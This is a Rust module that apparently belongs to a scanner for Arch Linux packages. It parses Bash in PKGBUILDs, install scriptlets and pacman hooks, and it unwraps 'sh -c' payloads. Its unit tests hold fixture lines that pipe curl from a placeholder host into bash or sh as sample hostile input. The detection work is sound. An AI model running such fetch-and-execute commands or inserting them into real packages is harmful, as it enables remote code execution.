use anyhow::{Context, Result};
use tree_sitter::{Node, Parser, Point};

use crate::{
    input::{FileKind, SourceFile},
    model::{Location, safe_snippet},
};

const MAX_INLINE_DEPTH: usize = 3;

#[derive(Debug, Clone)]
pub struct Command {
    pub text: String,
    pub command_name: Option<String>,
    pub location: Location,
    pub phase: Option<String>,
    pub node_kind: String,
}

#[derive(Debug, Default)]
pub struct BashAnalysis {
    pub commands: Vec<Command>,
    pub pipelines: Vec<Command>,
    pub parse_errors: Vec<Location>,
    pub comment_ranges: Vec<std::ops::Range<usize>>,
}

/// Position of a parsed fragment inside the containing file, so findings in
/// hook `Exec =` values and `sh -c` payloads report file coordinates.
#[derive(Debug, Clone, Copy, Default)]
struct Offset {
    row: usize,
    column: usize,
    byte: usize,
}

impl Offset {
    fn locate(self, point: Point) -> (usize, usize) {
        if point.row == 0 {
            (self.row + 1, self.column + point.column + 1)
        } else {
            (self.row + point.row + 1, point.column + 1)
        }
    }

    fn nested(self, start: Point, byte: usize) -> Self {
        if start.row == 0 {
            Self {
                row: self.row,
                column: self.column + start.column,
                byte: self.byte + byte,
            }
        } else {
            Self {
                row: self.row + start.row,
                column: start.column,
                byte: self.byte + byte,
            }
        }
    }
}

pub fn analyze(file: &SourceFile) -> Result<BashAnalysis> {
    let mut output = BashAnalysis::default();
    match file.kind {
        FileKind::Pkgbuild | FileKind::Install => {
            let phase = matches!(file.kind, FileKind::Install).then_some("install-scriptlet");
            parse_fragment(&file.text, phase, Offset::default(), 0, &mut output)?;
        }
        FileKind::Hook => {
            let mut line_start = 0;
            for (index, line) in file.text.split('\n').enumerate() {
                if let Some(value_offset) = hook_exec_value_offset(line) {
                    let offset = Offset {
                        row: index,
                        column: value_offset,
                        byte: line_start + value_offset,
                    };
                    parse_fragment(
                        &line[value_offset..],
                        Some("alpm-hook"),
                        offset,
                        0,
                        &mut output,
                    )?;
                }
                line_start += line.len() + 1;
            }
        }
        FileKind::Srcinfo => {}
    }
    Ok(output)
}

fn hook_exec_value_offset(line: &str) -> Option<usize> {
    let rest = line.trim_start().strip_prefix("Exec")?;
    let rest = rest.trim_start().strip_prefix('=')?;
    let value = rest.trim_start();
    if value.is_empty() {
        return None;
    }
    Some(line.len() - value.len())
}

fn parse_fragment(
    text: &str,
    phase: Option<&str>,
    offset: Offset,
    depth: usize,
    output: &mut BashAnalysis,
) -> Result<()> {
    if depth > MAX_INLINE_DEPTH || text.trim().is_empty() {
        return Ok(());
    }
    let mut parser = Parser::new();
    parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .context("cannot initialize Bash parser")?;
    let tree = parser
        .parse(text, None)
        .context("Bash parser returned no syntax tree")?;
    walk(
        tree.root_node(),
        text.as_bytes(),
        phase,
        offset,
        depth,
        output,
    );
    Ok(())
}

fn walk(
    node: Node<'_>,
    source: &[u8],
    phase: Option<&str>,
    offset: Offset,
    depth: usize,
    output: &mut BashAnalysis,
) {
    let current_phase = if node.kind() == "function_definition" {
        function_name(node, source).or_else(|| phase.map(ToOwned::to_owned))
    } else {
        phase.map(ToOwned::to_owned)
    };

    if node.is_error() || node.is_missing() {
        output.parse_errors.push(location(node, source, offset));
    }

    match node.kind() {
        "comment" => {
            let range = node.byte_range();
            output
                .comment_ranges
                .push(offset.byte + range.start..offset.byte + range.end);
        }
        "command" => {
            output.commands.push(Command {
                text: node_text(node, source),
                command_name: command_name(node, source),
                location: location(node, source, offset),
                phase: current_phase.clone(),
                node_kind: node.kind().to_owned(),
            });
            if let Some(payload) = inline_shell_payload(node, source) {
                let _ = parse_fragment(
                    payload.text,
                    current_phase.as_deref(),
                    offset.nested(payload.start, payload.byte),
                    depth + 1,
                    output,
                );
            }
        }
        "pipeline" => {
            output.pipelines.push(Command {
                text: node_text(node, source),
                command_name: None,
                location: location(node, source, offset),
                phase: current_phase.clone(),
                node_kind: node.kind().to_owned(),
            });
        }
        _ => {}
    }

    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        walk(
            child,
            source,
            current_phase.as_deref(),
            offset,
            depth,
            output,
        );
    }
}

struct InlinePayload<'a> {
    text: &'a str,
    start: Point,
    byte: usize,
}

/// Extracts the script string from `sh -c '...'` style commands so nested
/// shell code is analyzed instead of hiding inside a quoted argument.
fn inline_shell_payload<'a>(node: Node<'_>, source: &'a [u8]) -> Option<InlinePayload<'a>> {
    let name = command_name(node, source)?;
    let base = name.rsplit('/').next().unwrap_or(&name);
    if !matches!(base, "sh" | "bash" | "zsh" | "dash") {
        return None;
    }
    let mut cursor = node.walk();
    let arguments: Vec<Node<'_>> = node
        .children_by_field_name("argument", &mut cursor)
        .collect();
    let flag_index = arguments
        .iter()
        .position(|argument| argument.utf8_text(source).is_ok_and(is_command_flag))?;
    let payload = arguments.get(flag_index + 1)?;
    let quoted = matches!(payload.kind(), "string" | "raw_string");
    let mut range = payload.byte_range();
    let mut start = payload.start_position();
    if quoted {
        if range.len() < 2 {
            return None;
        }
        range = range.start + 1..range.end - 1;
        start.column += 1;
    }
    let text = std::str::from_utf8(source.get(range.clone())?).ok()?;
    Some(InlinePayload {
        text,
        start,
        byte: range.start,
    })
}

fn is_command_flag(text: &str) -> bool {
    let Some(flags) = text.strip_prefix('-') else {
        return false;
    };
    !flags.is_empty() && flags.contains('c') && flags.chars().all(|ch| ch.is_ascii_alphabetic())
}

fn function_name(node: Node<'_>, source: &[u8]) -> Option<String> {
    node.child_by_field_name("name")
        .map(|name| node_text(name, source))
        .filter(|name| !name.is_empty())
}

fn command_name(node: Node<'_>, source: &[u8]) -> Option<String> {
    node.child_by_field_name("name")
        .or_else(|| {
            let mut cursor = node.walk();
            node.named_children(&mut cursor)
                .find(|child| matches!(child.kind(), "command_name" | "word"))
        })
        .map(|name| {
            node_text(name, source)
                .trim_matches(|ch| matches!(ch, '\'' | '"'))
                .to_owned()
        })
        .filter(|name| !name.is_empty())
}

fn node_text(node: Node<'_>, source: &[u8]) -> String {
    node.utf8_text(source).unwrap_or_default().to_owned()
}

fn location(node: Node<'_>, source: &[u8], offset: Offset) -> Location {
    let (line, column) = offset.locate(node.start_position());
    Location {
        line,
        column,
        snippet: safe_snippet(&node_text(node, source)),
    }
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use crate::input::{FileKind, SourceFile};

    use super::{analyze, hook_exec_value_offset};

    #[test]
    fn hook_exec_values_are_parsed_with_file_coordinates() {
        let file = SourceFile {
            name: PathBuf::from("demo.hook"),
            text: "[Action]\nWhen = PostTransaction\nExec = /bin/sh -c 'curl https://x.example/p | bash'\n".to_owned(),
            kind: FileKind::Hook,
        };
        let analysis = analyze(&file).unwrap();
        let pipeline = analysis
            .pipelines
            .iter()
            .find(|pipeline| pipeline.text.contains("| bash"))
            .expect("nested pipeline");
        assert_eq!(pipeline.phase.as_deref(), Some("alpm-hook"));
        assert_eq!(pipeline.location.line, 3);
    }

    #[test]
    fn shell_dash_c_payloads_are_unwrapped() {
        let file = SourceFile {
            name: PathBuf::from("PKGBUILD"),
            text: "build() {\n  bash -c 'curl https://x.example/p | sh'\n}\n".to_owned(),
            kind: FileKind::Pkgbuild,
        };
        let analysis = analyze(&file).unwrap();
        let pipeline = analysis
            .pipelines
            .iter()
            .find(|pipeline| pipeline.text.contains("| sh"))
            .expect("nested pipeline");
        assert_eq!(pipeline.phase.as_deref(), Some("build"));
        assert_eq!(pipeline.location.line, 2);
    }

    #[test]
    fn exec_key_must_match_exactly() {
        assert!(hook_exec_value_offset("Exec = /usr/bin/true").is_some());
        assert!(hook_exec_value_offset("  Exec=/usr/bin/true").is_some());
        assert!(hook_exec_value_offset("Executable = /usr/bin/true").is_none());
        assert!(hook_exec_value_offset("Exec =").is_none());
    }
}
